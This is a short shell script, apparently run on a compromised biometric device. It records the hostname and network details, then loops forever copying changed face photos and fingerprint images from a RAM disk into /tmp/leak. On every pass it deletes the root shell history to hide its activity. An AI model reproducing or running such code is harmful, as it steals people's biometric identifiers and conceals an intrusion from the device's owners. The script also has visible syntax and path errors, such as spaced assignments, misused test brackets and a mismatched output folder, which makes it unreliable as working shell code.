#!/bin/sh

echo "Hell Yeah\n"
mkdir /tmp/leak
cat /etc/HOSTNAME

ifconfig | grep inet > /tmp/fuck/network_info.txt


while :
do

	 dt=`date '+%d-%m-%Y_%H-%M-%S_m'`

     face = "/mnt/ramdisk/picture.jpg"
     fp = "/mnt/ramdisk/finger.bmp"
     facev2 = "/mnt/ramdisk/picture.v2.jpg"
     fpv2 = "/mnt/ramdisk/finger.v2.bmp"

      if [ cmp -s "$face" "$facev2" ] ; then
        printf ' Same Shit...\n'
      else
        printf '[+] Leaking ...'
        cp /mnt/ramdisk/picture.jpg /tmp/leak/picture.jpg."$(date)"
      fi

      if [ cmp -s "$fp" "$fpv2" ] ; then
        printf ' Same Shit...\n'
      else
        printf '[+] Leaking...'
        cp /mnt/ramdisk/finger.bmp /tmp/leak/finger.bmp."$(date)"
      fi

      rm -rf /root/.ash_history

done
